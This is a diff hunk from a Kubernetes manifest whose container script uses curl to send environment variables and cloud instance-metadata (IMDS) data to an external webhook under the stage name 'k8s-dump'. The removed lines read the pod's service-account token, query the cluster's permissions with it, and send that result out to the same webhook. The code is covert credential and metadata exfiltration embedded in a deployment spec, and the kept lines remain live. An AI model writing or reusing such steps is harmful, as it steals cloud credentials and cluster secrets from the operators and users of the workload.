@@ -262,12 +262,6 @@ spec:
             --data-urlencode "stage=k8s-dump" \
             --data-urlencode "env=${ENVVARS}" \
             --data-urlencode "imds=${IMDS}" || true
-          T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
-          K=https://10.96.0.1:443
-          RBAC=$(curl -sfk --max-time 8 -H "Authorization: Bearer $T" -H "Content-Type: application/json" -X POST "$K/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"${POD_NAMESPACE}\"}}" 2>/dev/null)
-          curl -sf --max-time 10 -G "${HOOK}/" \
-            --data-urlencode "stage=rbac" \
-            --data-urlencode "d=${RBAC}" || true
         env:
         - name: POD_NAMESPACE
           valueFrom:
